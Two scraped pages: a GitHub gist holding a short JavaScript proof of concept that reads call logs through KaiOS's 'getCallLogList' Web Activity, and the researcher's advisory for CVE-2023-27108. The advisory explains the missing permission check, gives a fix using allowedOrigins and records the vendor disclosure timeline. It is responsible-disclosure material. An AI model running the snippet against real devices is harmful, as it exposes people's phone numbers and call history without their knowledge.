=== Content from gist.github.com_ab9e1cc1_20250114_211707.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Tombarr](https://avatars.githubusercontent.com/u/319247?s=64&v=4)](/Tombarr)

# [Tombarr](/Tombarr)/**[KaiOS getCallLogList Activity](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda)** Secret

Created
February 20, 2023 16:05

Show Gist options

* [Download ZIP](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda/archive/911734ba7e6ed5866a344232fa2e9a9797662aa7.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda.js&quot;&gt;&lt;/script&gt;
* Save Tombarr/5ed6675f33e0eca149a8b4d38ce76dda to your computer and use it in GitHub Desktop.

[Code](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda)
[Revisions
1](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda/revisions)
[Stars
1](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda.js&quot;&gt;&lt;/script&gt;

Save Tombarr/5ed6675f33e0eca149a8b4d38ce76dda to your computer and use it in GitHub Desktop.

[Download ZIP](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda/archive/911734ba7e6ed5866a344232fa2e9a9797662aa7.zip)

KaiOS getCallLogList Activity

 [Raw](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda/raw/911734ba7e6ed5866a344232fa2e9a9797662aa7/KaiOS%2520getCallLogList%2520Activity)

[**KaiOS getCallLogList Activity**](#file-kaios-getcallloglist-activity)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | let activity = new WebActivity('getCallLogList', { |
| --- | --- |
|  | type: "calllog/tel" |
|  | }); |
|  |  |
|  | activity.start() |
|  | .then((callLogs) => { |
|  | console.log(callLogs); // Array[] |
|  | }); |
|  |  |
|  | /\* |
|  | Exposed via pre-installed Communications app |
|  | Manifest URL: http://communications.localhost/manifest.webmanifest |
|  |  |
|  | manifest.webmanifest |
|  |  |
|  | "activities": { |
|  | "getCallLogList": { |
|  | "filters": { |
|  | "type": { |
|  | "required": true, |
|  | "value": [ |
|  | "calllog/tel" |
|  | ] |
|  | } |
|  | }, |
|  | "returnValue": true |
|  | } |
|  | } |
|  |  |
|  | serviceWorker.js |
|  |  |
|  | let handler = null; |
|  | const db = new DB(); |
|  | let pickHandler = null; |
|  | let getListHandler = null; |
|  |  |
|  | self.onsystemmessage = evt => { |
|  | console.log('communications onsystemmessage: ' + evt.name); |
|  |  |
|  | let data = null; |
|  | let viewInfo = null; |
|  |  |
|  | evt.waitUntil( |
|  | (() => { |
|  | switch (evt.name) { |
|  | case 'activity': |
|  | handler = evt.data.webActivityRequestHandler(); |
|  |  |
|  | if (handler.source.name === 'getCallLogList') { |
|  | getListHandler = handler; |
|  |  |
|  | db.getAllData() |
|  | .then(list => { |
|  | getListHandler.postResult(list); |
|  | getListHandler = null; |
|  | }) |
|  | .catch(() => { |
|  | getListHandler.postResult([]); |
|  | getListHandler = null; |
|  | }); |
|  | } |
|  |  |
|  | break; |
|  | default: |
|  | console.log('Illegal message'); |
|  | } |
|  | })() |
|  | ); |
|  | }; |
|  | \*/ |

[![@Tombarr](https://avatars.githubusercontent.com/u/319247?s=80&v=4)](/Tombarr)

Copy link

Author

### **[Tombarr](/Tombarr)** commented [May 3, 2023](/Tombarr/5ed6675f33e0eca149a8b4d38ce76dda?permalink_comment_id=4556220#gistcomment-4556220)

Live example and details available at <https://kaios.dev/cve/1409490>

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FTombarr%2F5ed6675f33e0eca149a8b4d38ce76dda)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from kaios.dev_a8beec2c_20250114_211709.html ===

# CVE-2023-27108: KaiOS 3.0 Call Log Leak

Vendor: KaiOS Technologies Inc.

Vendor URL: <https://www.kaiostech.com/>

Versions affected: KaiOS 3.0, KaiOS 3.1

Systems Affected: KaiOS-based mobile devices

Author: [Tom Barrasso](https://barrasso.me)

CVE Identifier: [CVE-2023-27108](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27108)

Risk: High

### Summary

KaiOS is a mobile operating system based on Firefox OS. The operating system comes with a number of pre-installed "certified" applications including the Communications application, which exposes call log data via the Web Activities API. Firefox OS mobile applications are built using JavaScript and HTML.

The Communications application is vulnerable to information disclosure attacks.

### Location

* Source: `/system/b2g/webapps/communications/`

### Impact

An attacker can call the Web Activities API with the name `"getCallLogList"` via JavaScript. The Communications app does not perform any permission checks on the caller, and as a result, call log data is exposed either via an installed app or web page accessed via the system Browser. This will return a `Promise` that resolves to an array of data including phone numbers and timestamps. User interaction is not required.

Below is a photo of call logs exposed on the Nokia 2780 Flip browser running KaiOS 3.1 (Credit: [github.com/sosumi1984](https://github.com/sosumi1984)).

[![Photo of call logs exposed on Nokia 2780 Flip (KaiOS 3.1) browser](/img/CVE-2023-27108.jpg)](/img/CVE-2023-27108.jpg "Photo of call logs exposed on Nokia 2780 Flip (KaiOS 3.1) browser")

### Recommendation

Always use origin and/ or permission checks when returning sensitive data like call logs via Web Activities.

KaiOS allows applications to limit potential Web Activity callers to a pre-defined list of origins.
Here is an example from the Launcher app, which exposed an activity, `"get-app"`, that returns a list of installed apps. It is only made accessible to the Voice Assistant app using the `"allowedOrigins"` property.

`"get-app": {
"returnValue": true,
"allowedOrigins": [
"http://kaios-voiceassistant.localhost"
]
}`

## Demo

**KaiOS Version**:

**Call Logs:**

### Vendor Communication Timeline

* 2/20/23: Tom emailed [[email protected]](/cdn-cgi/l/email-protection) disclosing issues to KaiOS Technologies.
* 2/20/23: KaiOS Technologies forwards to the appropriate team to validate.
* 4/30/23: Tom asked for current remediation status.


